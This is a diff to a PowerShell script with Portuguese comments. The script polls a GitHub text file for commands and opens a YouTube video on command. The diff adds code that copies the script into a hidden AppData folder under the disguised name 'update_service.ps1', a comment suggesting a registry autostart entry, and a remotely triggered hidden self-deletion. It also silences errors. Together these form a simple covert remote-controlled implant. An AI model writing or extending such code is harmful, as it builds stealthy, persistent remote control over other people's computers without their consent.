@@ -1,29 +1,35 @@
-# URL do arquivo de controle (ex: status.txt contendo "0" ou "1")
 $urlControle = "https://raw.githubusercontent.com/Thiii123/Penthi/main/status.txt"
-# URL do vídeo que você deseja abrir
-$videoYoutube = "https://www.youtube.com/watch?v=u1nOENqdpwU"
+$videoYoutube = "https://www.youtube.com/watch?v=S_OTz-lpDjw&list=RDEMXEN76kPmWQ-QLKEp_k4tlw&start_radio=1"
+# Caminho onde o script se "esconde" (Pasta AppData local)
+$caminhoLocal = "$env:LOCALAPPDATA\Microsoft\Windows\update_service.ps1"
+
+# Se o script não estiver rodando da pasta oculta, ele se copia para lá
+if ($PSCommandPath -ne $caminhoLocal) {
+    Copy-Item -Path $PSCommandPath -Destination $caminhoLocal -Force
+    # Opcional: Aqui você poderia adicionar uma chave no registro para iniciar com o Windows
+    exit
+}
 
 while ($true) {
     try {
-        # Consulta o status no GitHub
-        $status = Invoke-RestMethod -Uri $urlControle -UseBasicParsing
+        $comando = (Invoke-RestMethod -Uri $urlControle -UseBasicParsing).Trim()
         
-        # Se o valor for "1", ele executa a ação
-        if ($status.Trim() -eq "1") {
-            # Abre o navegador padrão no link do vídeo
+        # AÇÃO 1: ABRIR YOUTUBE
+        if ($comando -eq "1") {
             Start-Process $videoYoutube
-            
-            # Opcional: Aguarda o valor mudar para "0" antes de permitir nova execução
-            # Isso evita que ele abra 100 abas se você esquecer o status em "1"
-            while ((Invoke-RestMethod -Uri $urlControle -UseBasicParsing).Trim() -eq "1") {
-                Start-Sleep -Seconds 60
-            }
+            # Aguarda o comando mudar para não abrir mil abas
+            while ((Invoke-RestMethod -Uri $urlControle -UseBasicParsing).Trim() -eq "1") { Start-Sleep -Seconds 30 }
+        }
+        
+        # AÇÃO 2: AUTODESTRUIÇÃO
+        elseif ($comando -eq "apagar") {
+            # Cria um comando para deletar o arquivo após o fechamento do processo
+            Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-Command", "Start-Sleep -Seconds 5; Remove-Item -Path '$caminhoLocal' -Force"
+            exit # Fecha o script atual
         }
     }
     catch {
-        # Erro de conexão (ex: PC sem internet), tenta novamente no próximo ciclo
+        # Silencioso
     }
-
-    # Verifica a cada 60 segundos (ajuste conforme necessário)
     Start-Sleep -Seconds 60
 }
